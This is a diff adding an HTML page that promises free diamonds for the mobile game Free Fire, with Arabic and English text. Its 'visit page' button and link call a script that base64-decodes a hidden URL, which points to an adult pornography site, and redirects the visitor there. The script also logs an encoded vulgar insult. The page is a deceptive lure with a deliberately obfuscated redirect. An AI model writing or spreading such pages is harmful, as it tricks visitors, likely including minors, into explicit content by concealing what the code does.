@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>free fire</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            text-align: center;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        img {
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        a {
+            color: #007BFF;
+            text-decoration: none;
+            font-size: 16px;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        #arabic, #english {
+            background-color: #28a745;
+        }
+
+        #arabic:hover, #english:hover {
+            background-color: #218838;
+        }
+
+        #link {
+            display: block;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <button id="arabic">arabic</button>
+        <button id="english">english</button>
+    </div>
+    <h1 id="h1">how to get free fire diamond for free ?</h1>
+    <img width="100px" height="100px" src="https://img.gg.deals/75/c2/58d8b1e9789db57a1071daf1b03175c41a09_616cr353.jpg" alt="">
+    <br>
+    <button id="button" onclick="redirectToLink()">click here to visit page</button>
+    <br>
+    <a id="link" href="#" onclick="redirectToLink()">Open to see the show</a>
+    
+    <script>
+        let arabic = document.getElementById("arabic");
+        let english = document.getElementById("english");
+        let h1 = document.getElementById("h1");
+        let button = document.getElementById("button");
+        let link = document.getElementById("link");
+        arabic.addEventListener("click", () => {
+            h1.innerText="كيف تحصل على جواهر  فري فاير مجانا"
+            button.innerText="اظغط هنا لزيارة الصفحة "
+            link.innerText="فتح الرابط"
+        })
+        english.addEventListener("click", () => {
+            h1.innerText="how to get free fire diamond for free ?"
+            button.innerText="click here to visit page"
+            link.innerText="Open to see the show"
+        })
+        function redirectToLink() {
+            const itat = "aHR0cDovL3hueHguY29t"; 
+            const system = atob(itat);
+            window.location.href = system;
+            console.log(atob("bWF0aGthcmJhOXggbHlhIGxrb2QgbGFoIHluM2wgdGJvb24gbW9rIA=="))
+        }
+    </script>
+</body>
+</html>
